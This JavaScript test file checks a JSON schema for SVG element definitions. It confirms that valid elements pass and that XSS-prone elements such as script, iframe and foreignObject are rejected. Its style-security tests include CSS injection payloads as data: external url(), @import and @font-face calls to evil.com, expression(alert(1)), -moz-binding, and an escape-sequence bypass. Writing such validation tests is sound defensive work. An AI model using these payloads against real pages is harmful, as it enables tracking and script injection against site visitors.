import { describe, it } from "node:test";
import assert from "node:assert/strict";
import {
  loadSchema,
  createValidator,
  getDefSchema,
} from "../helpers/validator.js";

const schema = loadSchema("definition.json");
const elementSchema = getDefSchema(schema, "element");
const validate = createValidator(elementSchema);

describe("definition.json $defs/element", () => {
  describe("valid elements", () => {
    it("accepts element with name", () => {
      assert.equal(validate({ type: "element", name: "rect" }), true);
    });

    it("accepts minimal text type", () => {
      assert.equal(validate({ type: "text" }), true);
    });

    it("accepts component with value", () => {
      assert.equal(validate({ type: "component", value: "eyes" }), true);
    });

    for (const name of ["initial", "initials", "fontFamily", "fontWeight"]) {
      it(`accepts text with variable value object (${name})`, () => {
        assert.equal(
          validate({ type: "text", value: { type: "variable", value: name } }),
          true,
        );
      });
    }

    it("accepts element with name, attributes and children", () => {
      assert.equal(
        validate({
          type: "element",
          name: "g",
          attributes: {},
          children: [],
        }),
        true,
      );
    });

    it("accepts recursive children", () => {
      assert.equal(
        validate({
          type: "element",
          name: "g",
          children: [
            {
              type: "element",
              name: "rect",
              children: [{ type: "text", value: "hello" }],
            },
          ],
        }),
        true,
      );
    });
  });

  describe("invalid elements", () => {
    it("rejects missing type", () => {
      assert.equal(validate({ name: "rect" }), false);
    });

    it("rejects invalid type enum value", () => {
      assert.equal(validate({ type: "unknown" }), false);
    });

    it("rejects element without required name", () => {
      assert.equal(validate({ type: "element" }), false);
    });

    it("rejects component without required value", () => {
      assert.equal(validate({ type: "component" }), false);
    });

    it('rejects "variable" as element type', () => {
      assert.equal(validate({ type: "variable" }), false);
    });

    it("rejects invalid SVG element name", () => {
      assert.equal(validate({ type: "element", name: "div" }), false);
    });

    it("rejects value as number", () => {
      assert.equal(validate({ type: "text", value: 123 }), false);
    });

    it("rejects children as string", () => {
      assert.equal(
        validate({ type: "element", name: "g", children: "abc" }),
        false,
      );
    });

    it("rejects child without required type", () => {
      assert.equal(
        validate({
          type: "element",
          name: "g",
          children: [{ name: "rect" }],
        }),
        false,
      );
    });

    it("rejects additional properties", () => {
      assert.equal(
        validate({ type: "element", name: "rect", malicious: "data" }),
        false,
      );
    });
  });

  describe("dangerous element names (XSS prevention)", () => {
    for (const name of [
      "script",
      "foreignObject",
      "a",
      "animate",
      "animateTransform",
      "animateMotion",
      "set",
      "iframe",
      "object",
      "embed",
    ]) {
      it(`rejects ${name} element`, () => {
        assert.equal(validate({ type: "element", name }), false);
      });
    }
  });

  describe("type-specific value rules", () => {
    it("accepts text type with string value", () => {
      assert.equal(validate({ type: "text", value: "hello world" }), true);
    });

    it("rejects component type with invalid name value", () => {
      assert.equal(
        validate({ type: "component", value: "Invalid Name" }),
        false,
      );
    });

    it("rejects variable value object with unknown variable name", () => {
      assert.equal(
        validate({ type: "text", value: { type: "variable", value: "skinColor" } }),
        false,
      );
    });

    it("rejects variable value object without type", () => {
      assert.equal(
        validate({ type: "text", value: { value: "skinColor" } }),
        false,
      );
    });

    it("rejects variable value object without value", () => {
      assert.equal(
        validate({ type: "text", value: { type: "variable" } }),
        false,
      );
    });

    it("rejects variable value object with additional properties", () => {
      assert.equal(
        validate({ type: "text", value: { type: "variable", value: "skinColor", extra: "data" } }),
        false,
      );
    });

    it("rejects value on non-style element", () => {
      assert.equal(
        validate({ type: "element", name: "rect", value: "test" }),
        false,
      );
    });
  });

  describe("type-specific children rules", () => {
    it("accepts element type with children", () => {
      assert.equal(
        validate({
          type: "element",
          name: "g",
          children: [{ type: "element", name: "rect" }],
        }),
        true,
      );
    });

    it("accepts text type with children", () => {
      assert.equal(
        validate({
          type: "text",
          children: [{ type: "element", name: "tspan" }],
        }),
        true,
      );
    });

    it("rejects component type with children", () => {
      assert.equal(
        validate({
          type: "component",
          value: "eyes",
          children: [{ type: "element", name: "rect" }],
        }),
        false,
      );
    });
  });

  describe("style element value security", () => {
    it("accepts style element with safe CSS", () => {
      assert.equal(
        validate({
          type: "element",
          name: "style",
          value: ".cls { fill: red; stroke: blue; }",
        }),
        true,
      );
    });

    it("accepts style element with local url() reference", () => {
      assert.equal(
        validate({
          type: "element",
          name: "style",
          value: ".cls { fill: url(#gradient); }",
        }),
        true,
      );
    });

    it("rejects style element with external url()", () => {
      assert.equal(
        validate({
          type: "element",
          name: "style",
          value: ".cls { background: url(https://evil.com/track); }",
        }),
        false,
      );
    });

    it("rejects style element with @import", () => {
      assert.equal(
        validate({
          type: "element",
          name: "style",
          value: "@import url('https://evil.com/steal.css');",
        }),
        false,
      );
    });

    it("rejects style element with @font-face", () => {
      assert.equal(
        validate({
          type: "element",
          name: "style",
          value:
            "@font-face { font-family: evil; src: url('https://evil.com/font.woff'); }",
        }),
        false,
      );
    });

    it("rejects style element with expression()", () => {
      assert.equal(
        validate({
          type: "element",
          name: "style",
          value: ".cls { width: expression(alert(1)); }",
        }),
        false,
      );
    });

    it("rejects style element with -moz-binding", () => {
      assert.equal(
        validate({
          type: "element",
          name: "style",
          value: ".cls { -moz-binding: url(https://evil.com/xbl#xss); }",
        }),
        false,
      );
    });

    it("rejects style element with CSS escape sequence (backslash)", () => {
      assert.equal(
        validate({
          type: "element",
          name: "style",
          value: ".cls { background: \\75\\72\\6C(https://evil.com); }",
        }),
        false,
      );
    });
  });
});
